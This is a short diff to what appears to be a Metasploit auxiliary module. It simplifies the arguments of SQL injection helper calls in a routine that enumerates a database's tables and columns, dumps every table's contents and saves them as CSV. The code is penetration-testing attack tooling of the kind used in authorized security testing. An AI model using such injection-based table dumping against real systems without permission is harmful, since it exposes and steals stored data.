@@ -124,7 +124,7 @@ class MetasploitModule < Msf::Auxiliary
     db_version = sqli.version
     print_status("DB Version: #{db_version}")
     print_status('Enumerating tables, this may take a moment...')
-    tables = sqli.enum_table_names('database()')
+    tables = sqli.enum_table_names
     num_tables = tables.length
     print_status("Identified #{num_tables} tables.")
     # These tables are impossible to fetch because they increase each request
@@ -135,9 +135,9 @@ class MetasploitModule < Msf::Auxiliary
       if skiptables.include?(table)
         print_status("Skipping table (#{i + 1}/#{num_tables}): #{table}")
       else
-        columns_of_table = sqli.enum_table_columns('database()', table)
+        columns_of_table = sqli.enum_table_columns(table)
         print_status("Dumping table (#{i + 1}/#{num_tables}): #{table}(#{columns_of_table.join(', ')})")
-        table_data = sqli.dump_table_fields('database()', table, columns_of_table)
+        table_data = sqli.dump_table_fields(table, columns_of_table)
         table_data.unshift(columns_of_table)
         save_csv(table_data, table)
       end
